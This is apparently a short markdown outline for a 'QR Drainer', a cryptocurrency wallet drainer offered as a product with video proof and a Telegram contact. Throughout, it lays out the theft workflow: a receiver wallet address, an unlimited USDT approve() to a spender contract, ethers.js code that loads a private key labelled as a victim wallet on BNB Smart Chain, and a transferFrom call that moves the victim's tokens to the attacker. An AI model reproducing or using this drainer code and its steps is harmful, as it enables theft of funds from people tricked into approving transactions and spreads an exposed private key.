
# QR Drainer

## Video proof of the product working
- Today's date/time
- Telegram username
- switch between the product and our chat


## VPS purchase link
- https://cart.hostinger.com/pay/201af656-7f53-412d-923c-c86fb0fabee8


## Receiver wallet address
- 0x503AC058d34DB233615684ce1a6e4a1C31f3A5E6



## USDT approve
- 0x55d398326f99059fF775485246999027B3197955
- approve(spender, amount);
- spender = 0xc72b196cd968f4a9fb724a8666d144e030a68732
- amount = ethers.MaxUint256
- const approveAmount = ethers.MaxUint256;
- 2n ** 256n - 1n
- BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
- type(uint256).max
- console.log(`Victim USDT approved amount: ${approveAmount}`);

## Sponder smart contract for USDT approve 
- https://bscscan.com/address/0xc72b196cd968f4a9fb724a8666d144e030a68732


## Private key or Victim wallet 
- 0x90aeee049c7f5c10f5b7f7fcdfe80048dbc4289ef3946f53380b1bb0d1606500
- 0xeE123C21bD75BA6E9d55fa96D863c8c73579B3BB
- const ethers = require("ethers");
- const provider = new ethers.JsonRpcProvider(`https://bsc-dataseed.binance.org`);
- const wallet = new ethers.Wallet(`0x90aeee049c7f5c10f5b7f7fcdfe80048dbc4289ef3946f53380b1bb0d1606500`, provider);
- console.log(`Victim wallet address: ${wallet.address}`);


## Transfer the USDT 
- IERC20(token).transferFrom(victim, msg.sender, amount);
